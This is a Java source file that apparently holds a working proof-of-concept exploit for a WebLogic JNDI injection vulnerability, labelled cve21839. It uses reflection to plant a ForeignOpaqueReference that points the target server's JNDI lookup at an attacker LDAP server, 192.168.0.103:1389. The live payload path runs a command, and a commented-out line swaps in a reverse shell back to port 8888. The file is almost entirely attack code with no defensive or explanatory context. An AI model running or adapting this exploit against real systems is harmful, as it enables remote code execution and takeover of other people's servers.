package weblogic;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.lang.reflect.Field;
import java.util.Hashtable;

public class cve21839 {
    static String JNDI_FACTORY="weblogic.jndi.WLInitialContextFactory";
    private static InitialContext getInitiaContext(String url) throws NamingException{
        Hashtable<String,String> env=new Hashtable<String,String>();
        env.put(Context.INITIAL_CONTEXT_FACTORY,JNDI_FACTORY);
        env.put(Context.PROVIDER_URL,url);

        return new InitialContext(env);
    }

    public static void main(String[] args) throws NamingException, NoSuchFieldException, IllegalAccessException {

        System.out.println("Hello world!");

        InitialContext c=getInitiaContext("t3://127.0.0.1:7001");
        Hashtable<String,String> env=new Hashtable<String,String>();

        env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");

        weblogic.deployment.jms.ForeignOpaqueReference f=new weblogic.deployment.jms.ForeignOpaqueReference();
        Field jndiEnvironment=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField("jndiEnvironment");
        jndiEnvironment.setAccessible(true);
        jndiEnvironment.set(f,env);
        Field remoteJNDIName=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField("remoteJNDIName");
        remoteJNDIName.setAccessible(true);

        remoteJNDIName.set(f,"ldap://192.168.0.103:1389/Basic/Command/calc");
//        remoteJNDIName.set(f,"ldap://192.168.0.103:1389/Basic/ReverseShell/192.168.0.103/8888");
        c.bind("aaa23112111",f);
        c.lookup("aaa23112111");
        System.out.println("end");

    }
}